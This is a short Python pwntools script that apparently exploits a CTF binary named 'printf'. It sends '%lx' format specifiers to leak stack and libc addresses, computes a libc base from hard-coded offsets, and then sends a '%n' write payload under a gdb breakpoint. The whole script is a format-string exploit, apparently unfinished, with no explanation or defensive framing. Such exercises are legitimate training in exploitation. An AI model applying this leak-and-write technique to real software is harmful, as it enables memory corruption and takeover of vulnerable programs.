from pwn import *

e = ELF("./printf")
libc = ELF("./libc.so.6")

p = process(["./ld.so", e.path], env={"LD_PRELOAD": libc.path}, aslr=False)

pay = ""
for i in range(0x20):
  pay += "%lx "

p.sendline(pay)

p.recvuntil("Hi,")
p.recvline()

for i in range(0x20 - 4):
  p.recvuntil(" ")

stack = int(p.recvuntil(" "), 16) 
print("{:#x}".format(stack))

p.recvuntil(" ")

libc = int(p.recvuntil(" "), 16) + 0x0000155555331000 - 0x1555553ebb55
print("{:#x}".format(libc))

pay = ""
pay += "%n ".ljust(8, " ")

gdb.attach(p, "b *0x000015555551f36e")
p.sendline(pay)

p.interactive()
